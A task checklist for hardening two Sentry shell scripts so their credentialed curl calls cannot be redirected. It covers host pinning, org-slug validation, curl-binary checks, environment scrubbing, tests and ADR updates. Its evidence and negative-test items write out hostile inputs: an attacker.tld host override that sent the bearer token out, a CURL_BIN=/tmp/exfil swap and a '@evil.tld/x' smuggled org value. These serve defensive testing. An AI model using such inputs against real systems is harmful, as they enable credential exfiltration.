# Tasks — fix #7997: transport-confine and destination-pin the Sentry scripts' credentialed curl

Derived from `knowledge-base/project/plans/2026-09-10-fix-sentry-curl-transport-confinement-plan.md`
(post-review, post-deepen). Content anchors, not line numbers (`cq-cite-content-anchor-not-line-number`).
Every shape below is the one measured in **M20/M25** — do not paraphrase it.

## 0. Re-measure before touching anything

- [x] 0.1 `python3 scripts/lint-shell-trace-credential-refusal.py scripts/sentry-alert-live-fidelity.sh apps/web-platform/scripts/sentry-monitors-audit.sh` — expect **6 violations in 2 scanned files**, exit 1. (M1)
- [x] 0.2 `python3 scripts/lint-shell-trace-credential-refusal.py --changed --base origin/main` — expect `OK: 0 scanned file(s)`. **Load-bearing here, not only as AC2:** anything else means another branch has already touched these files and the plan needs re-scoping before any edit. (M2)
- [x] 0.3 `python3 scripts/lint-shell-trace-credential-refusal.py --census` — `offenders_d` must be `82`. (M3)
- [x] 0.4 `grep -vc '^#' scripts/lint-shell-trace-credential-refusal-d.baseline.txt` = `82`; both Sentry scripts listed. (M4)
- [x] 0.5 `doppler run -p soleur -c prd -- bash scripts/sentry-alert-live-fidelity.sh` — `PASS (all 28 …)`, exit 0. (M8)
- [x] 0.6 Re-confirm M18: substitute a literal `curl` for `"$CURL_BIN"` on the `curl_retry` line in a scratch copy and run the lint — it must still report **nothing at that line**. This keeps the lint widening out of scope.
- [x] 0.7 Re-confirm M19: `python3 scripts/lint-shell-trace-credential-refusal.py scripts/compound-promote.sh scripts/learning-retrieval-bench.sh` — 2 violations, exit 1. This is why those two files stay out of scope.
- [x] 0.8 Record the RED evidence for the PR body: M9 (stub `curl` on PATH, `SENTRY_API_HOST=attacker.tld` on the **unmodified** audit script → bearer to `https://attacker.tld/api/0/organizations/jikigai-eu/`) and M24 (`CURL_BIN=/tmp/exfil` → bearer to an arbitrary program).

## 1. `scripts/sentry-alert-live-fidelity.sh`

- [x] 1.1 RED first: add rows **F14-F18** to `tests/scripts/test-sentry-alert-live-fidelity.sh` and watch them fail. F14/F15/F16/F17 use a **PATH-shimmed `curl` with `SENTRY_FIXTURE_RULES` unset** — the fixture short-circuit precedes the host adjudication, so a fixture-mode row asserts nothing about it. F18 keeps fixture mode and asserts the 13 pre-existing rows still pass.
- [x] 1.2 Set `EXPECTED_TESTS` to **18** (13 today + 5). It is an exact-equality harness, not a floor. Add the invariant next to it: "must equal the number of `t_*` invocations in the call block at the foot of the file."
- [x] 1.3 Immediately after anchor `: "${SENTRY_ORG:?SENTRY_ORG must be set}"`, in this order:
      (a) `unset SSLKEYLOGFILE CURL_CA_BUNDLE SSL_CERT_FILE SSL_CERT_DIR CURL_HOME HOSTALIASES LOCALDOMAIN RES_OPTIONS`;
      (b) `_safe() { printf '%s' "${1//[[:cntrl:]]/}" | cut -b1-120; }` — **defined before its first call**; `-b`, not `-c` (M26);
      (c) `( LC_ALL=C; [[ "$SENTRY_ORG" =~ ^[a-z0-9][a-z0-9-]{0,62}$ ]] ) || { printf 'ERROR: refusing org %s\n' "$(_safe "$SENTRY_ORG")" >&2; exit 2; }` — the subshell is mandatory: `LC_ALL=C [[ … ]]` is a parse error (M22), and without the scoping the range admits 1,162 non-ASCII characters under `en_US.UTF-8` (M23). `{0,62}` = 63 octets, RFC 1035 §2.3.4;
      (d) `readonly SENTRY_ORG`.
      The test must name `$SENTRY_ORG` **literally** inside the `[[ … =~ … ]]` — a `_org_ok "$1"` helper leaves the lint red (M28).
- [x] 1.4 Host adjudication **inside `fetch_rules()`**, immediately after anchor `: "${SENTRY_API_HOST:?SENTRY_API_HOST must be set (org-subdomain, e.g. jikigai-eu.sentry.io)}"`:
      `case "$SENTRY_API_HOST" in "${SENTRY_ORG}.sentry.io") ;; *) printf 'ERROR: refusing destination host %s\n' "$(_safe "$SENTRY_API_HOST")" >&2; exit 2 ;; esac`.
      Singleton — this file's only endpoint is org-scoped and ADR-031 permits only the org subdomain there. Arm **double-quoted** (an unquoted arm is a glob: M27). Do not rewrite it into a `$`-free literal; `_pin_re`'s `case` branch needs only one literal character (M20), and a `$`-free arm would red production.
- [x] 1.5 `--disable --noproxy '*' --proto '=https' -g` as the first four arguments at anchor `curl -fsS --max-time 15 \`.
- [x] 1.6 Adapt the header prose from `scripts/supabase-logs-query.sh`'s `# HOST PIN — NO ENV OVERRIDE` block, extended to name the resolver/trust-anchor vector (M21). **Update the exit-code contract** at anchors `Exit 0 = every in-scope rule matches the capture.` / `Exit 1 = a divergence, …` to add exit 2.
- [x] 1.7 `bash -n`; F14-F18 green; all 13 pre-existing rows green.

## 2. `apps/web-platform/scripts/sentry-monitors-audit.sh`

- [x] 2.1 RED first: extend `mk_curl_stub` in `apps/web-platform/scripts/sentry-monitors-audit.test.sh` to log every URL and — **gated on `STUB_REQUIRE_DISABLE=1`**, exported by `run_sut_stubbed` and the new rows only — to assert `$1 == --disable && $2 == --noproxy && $3 == '*'`. An unconditional check reds T18d, whose bare stub invocations (anchor `body_bare=$("$TMP18/curl" -s "https://de.sentry.io/api/0/x/"`) have `$1 == -s` by design.
- [x] 2.2 Add rows **T26-T34** (continue the file's own numbering; T1/T2/T13/T16-T24 are taken). Hostile rows run **non-fixture** via `run_sut_stubbed` — `SENTRY_FIXTURE_MONITORS` skips the whole 4-gate block, which would make both halves of the assertion satisfiable by the delete mutant. Watch them fail.
- [x] 2.3 Add `SENTRY_AUDIT_TEST_CURL_BIN=1` to T18a-f's environment — the `CURL_BIN` adjudication sits inside T18's `awk` slice and fails at source time without it.
- [x] 2.4 Change anchor `: "${SENTRY_ORG:=jikigai}"` to a required form (`:?`), matching the sibling script. `jikigai` is recorded canceled vendor-side in `ADR-031-sentry-as-iac.md`. Verify T1 still passes — it runs under `env -i` and greps for `SENTRY_AUTH_TOKEN`, whose check precedes this line.
- [x] 2.5 Immediately below 2.4 and **above** anchor `CURL_BIN="${CURL_BIN:-curl}"`: the same four-part block as task 1.3 (prologue, `_safe`, subshell-scoped org refusal, `readonly SENTRY_ORG`). Above `CURL_BIN=` keeps it outside T18's `awk` slice.
- [x] 2.6 Immediately **after** the `CURL_BIN=` anchor: `[[ "$CURL_BIN" == "curl" || -n "${SENTRY_AUDIT_TEST_CURL_BIN:-}" ]] || { printf 'ERROR: refusing curl binary %s\n' "$(_safe "$CURL_BIN")" >&2; exit 2; }` (M24).
- [x] 2.7 `readonly SENTRY_HOST_CANDIDATES=("${SENTRY_ORG}.sentry.io" eu.sentry.io de.sentry.io sentry.io)` immediately above anchor `# --- Region detection (skipped if SENTRY_API_HOST is set) -----------------`. **Four members — no `us.sentry.io`.** In-file comment: this set is wider than the org-scoped contract requires, and the reason is 21 suite rows passing `de.sentry.io`; tightening it is a follow-up.
- [x] 2.8 Rewrite the loop to `for candidate in "${SENTRY_HOST_CANDIDATES[@]}"`, and render the `ERROR: Sentry token not valid against any candidate host (…)` message from the array rather than a second hand-written list.
- [x] 2.9 Membership refusal between the discovery block's closing `fi` and anchor `# --- 4-gate destination-controllability check (PR-β §10 / C5) -------------`:
      `_host_ok=0; for _c in "${SENTRY_HOST_CANDIDATES[@]}"; do [[ "$api_host" == "$_c" ]] && _host_ok=1; done` then `[[ "$_host_ok" -eq 1 ]] || { printf 'ERROR: refusing destination host %s (amend SENTRY_HOST_CANDIDATES)\n' "$(_safe "$api_host")" >&2; exit 2; }` then `readonly api_host`.
      RHS **double-quoted** (M27). The message must be textually distinguishable from the file's pre-existing `exit 2` at anchor `ERROR: residency mismatch — probed=` — `attacker.tld` reaches that one too, so `rc == 2` alone is non-discriminating.
- [x] 2.10 `--disable --noproxy '*' --proto '=https' -g` first at anchor `http=$(curl -s --max-time 10 -o /dev/null -w '%{http_code}' \`.
- [x] 2.11 Same flags first at anchor `curl -s --max-time 10 -X DELETE \`.
- [x] 2.12 Same flags **inside** `curl_retry` at anchor `if result=$("$CURL_BIN" -D "$hdr" "$@" 2>/dev/null); then` — not at the call sites, so they never enter `"$@"` and the write-safety argv scan is structurally unaffected.
- [x] 2.13 `bash -n`; T26-T34 green; **T1, T13, T16, T17, T17b, T18a-f, T20b/d/e and T22 all still green**.

## 3. The three workflow edits

- [x] 3.1 `.github/workflows/sentry-audit-gate.yml`: add the `unset` prologue at the top of the `run:` block and `--disable --noproxy '*' --proto '=https' -g` as the first arguments at anchor `http=$(curl -s -o /dev/null -w '%{http_code}' \`. Same job, same secrets, runs **before** the script. (Destination adjudication there is Deferral 3 — #7898 §3, YAML scope gap.)
- [x] 3.2 `.github/workflows/scheduled-sentry-alert-drift.yml`: in the probe-unavailable issue body, after anchor `printf -- '- Run log: %s\n\n' "$RUN_URL"`, dump the probe output the way the sibling drift filer already does — a fenced `cat "${RUNNER_TEMP}/probe.txt"` guarded on the file existing. **This is not a static checklist item:** the body today never `cat`s `probe.txt`, so the refusal message would reach only the run log.
- [x] 3.3 `.github/workflows/reusable-release.yml`: at anchor `::warning::Sentry migration audit script exited`, branch the warning text on a refusal (`grep -q 'refusing'`) so the swallowed path names the secret pairing instead of the non-array-payload diagnostic a refusal never reaches.
- [x] 3.4 `actionlint` on all three; `bash -c` on any extracted `run:` snippet (never `bash -n` on the YAML).

## 4. Baseline drawdown

- [ ] 4.1 Delete exactly the lines `apps/web-platform/scripts/sentry-monitors-audit.sh` and `scripts/sentry-alert-live-fidelity.sh` from `scripts/lint-shell-trace-credential-refusal-d.baseline.txt`. **Do not** run `--write-baseline-d`.
- [ ] 4.2 `python3 scripts/lint-shell-trace-credential-refusal.py` (repo-wide, no flags) — exit 0, `80 baselined (D)`.
- [ ] 4.3 `grep -c 'sentry-alert-live-fidelity\|sentry-monitors-audit' …-d.baseline.txt` = `0`; `grep -vc '^#'` = `80`. This, not 4.2, is what proves the drawdown happened.

## 5. ADR amendments

- [ ] 5.1 Read, then amend `knowledge-base/engineering/architecture/decisions/ADR-202-enforce-runtime-state-hazards-with-a-carried-self-refusal.md` — **`## Consequences` and `### Named residual holes` only; leave `## Decision` untouched.** Add the Rule D contract and its three residuals: (a) a wrapper-*function* invocation is out of reach even under a recogniser widening (M18); (b) a post-request or classification-only adjudication satisfies `_pin_re` while confining nothing; (c) the rule says nothing about the resolver, trust anchor, TLS keylog or the binary — all measured caller-settable with a compliant call site (M21/M24).
- [ ] 5.2 Read, then amend `knowledge-base/engineering/architecture/decisions/ADR-031-sentry-as-iac.md` — correct the line at anchor `The canonical EU API base_url is therefore` (it names `https://eu.sentry.io/api/`, contradicted by the same file's host-glossary MUST and by `apps/web-platform/infra/sentry/main.tf`'s `base_url = "https://${var.sentry_org}.sentry.io/api/"`), and add one sentence recording that the audit script's `/users/me/` discovery probe is that file's only slug-less credentialed call. **Do not** word it as "`SENTRY_HOST_CANDIDATES` is the single source of truth". Edit by full filename — ordinal 031 is duplicated in this repo.
- [ ] 5.3 Run the ADR gates `scripts/test-all.sh` registers, including `scripts/check-adr-ordinals.sh`; confirm the duplicate 031 is tolerated today rather than assuming it.

## 6. Verification

- [ ] 6.1 `python3 scripts/lint-shell-trace-credential-refusal.py scripts/sentry-alert-live-fidelity.sh apps/web-platform/scripts/sentry-monitors-audit.sh` → `OK: 2 scanned file(s), 0 baselined (A/B/C), 0 baselined (D)`. Necessary, not sufficient (M30).
- [ ] 6.2 `python3 scripts/lint-shell-trace-credential-refusal.py --changed --base origin/main` → exit 0 **and** a scanned-file count ≥ 2; record the count.
- [ ] 6.3 `bash scripts/test-all.sh scripts` green.
- [ ] 6.4 `bash plugins/soleur/test/c4-count-parity.test.sh` green (this PR edits three workflow files, where C1-C3, C5 and C7 derive from).
- [ ] 6.5 `python3 scripts/lint-guard-contract.py` green on the plan.
- [ ] 6.6 Live: `doppler run -p soleur -c prd -- bash scripts/sentry-alert-live-fidelity.sh` → `PASS (all 28 …)` **with** the prologue, `--proto '=https'` and `-g` in place (M25).
- [ ] 6.7 Environment confinement, live: the same command with `LOCALDOMAIN=com RES_OPTIONS=ndots:5 SSLKEYLOGFILE=<path>` injected **inside** the `doppler run` child still passes, and `<path>` is not created (M25).
- [ ] 6.8 Negative arms, fidelity: `doppler run -p soleur -c prd -- env SENTRY_API_HOST=<h> bash scripts/sentry-alert-live-fidelity.sh` for each of `attacker.tld`, `eu.sentry.io`, `de.sentry.io`, `sentry.io`, plus the `SENTRY_ORG='@evil.tld/x'` variant → exit 2 and the refusal's own message anchor. **`env` must be inside `doppler run`** — outside it, Doppler overwrites the hostile value and the arm passes without firing.
- [ ] 6.9 Negative arms, audit: `SENTRY_API_HOST=attacker.tld`, `SENTRY_ORG='@evil.tld/x'` and `CURL_BIN=/tmp/exfil` with the stub `curl` on PATH, **non-fixture** → exit 2, **zero** URLs recorded, message anchor present.
- [ ] 6.10 Region discovery: all four candidates plus the all-fail arm. Assert on the URL log, **not** the exit code. M13 covered candidates 1, 2, 4 and all-fail; M29 covered candidate 3.
- [ ] 6.11 Production pairing: (a) hermetic must-PASS rows in both suites with `SENTRY_ORG=jikigai-eu SENTRY_API_HOST=jikigai-eu.sentry.io`; (b) `doppler run -p soleur -c prd -- env SENTRY_FIXTURE_MONITORS=<empty-array fixture> bash apps/web-platform/scripts/sentry-monitors-audit.sh` reaches past all three guards. Fixture mode is required for (b) — the 4-gate block contains a live `POST /releases/`.
- [ ] 6.12 Locale-independence: the org guard refuses a non-ASCII fixture under **both** `LC_ALL=C` and `LC_ALL=en_US.UTF-8`, and accepts a 63-character slug while refusing a 64-character one.

## 7. Follow-ups, decision record and PR body

- [ ] 7.1 `gh label list --limit 200 | grep -E '^(priority/p3-low|type/chore|type/security|domain/engineering)\b'`; substitute the nearest existing label if one is absent.
- [ ] 7.2 File: "delete or gate the Sentry region-discovery loop" — carries M6/M7, the six invocation sites, the stub-only-evidence cost, and the two sub-questions (add `us.sentry.io` deliberately? tighten the audit script's chokepoint to the singleton?).
- [ ] 7.3 File: "adjudicate `SENTRY_ORG` against the org id Gate 1 returns, and adjudicate `SENTRY_PROJECT`" — closes the parameterised-set residual and the `-g`-mitigated request fan-out.
- [ ] 7.4 File: "route a `sentry-audit-gate.yml` failure to a human, and adjudicate its inline `curl` destination" — plus the secret-pairing recovery runbook.
- [ ] 7.5 Comment on **#7898** correcting its §4 "no current offender uses that seam" claim; attach M9, M18 and M24. Note its census says 67 files while the D baseline holds 82.
- [ ] 7.6 Finalise `knowledge-base/project/specs/feat-one-shot-7997-sentry-curl-transport-confinement/decision-challenges.md` (seeded at plan time) — `/ship` renders it into the PR body and files it as `action-required`.
- [ ] 7.7 PR body: `Closes #7997` and `Refs #7898` in the **body**, not the title; the credential-rotation finding (rotate, or why not); the three follow-up links; and the M9/M24-vs-6.9 before/after contrast.
- [ ] 7.8 Note for `/ship`: #7997 sits on milestone "Post-MVP / Later" while this plan declares `single-user incident` — re-milestone or re-label `type/security`.
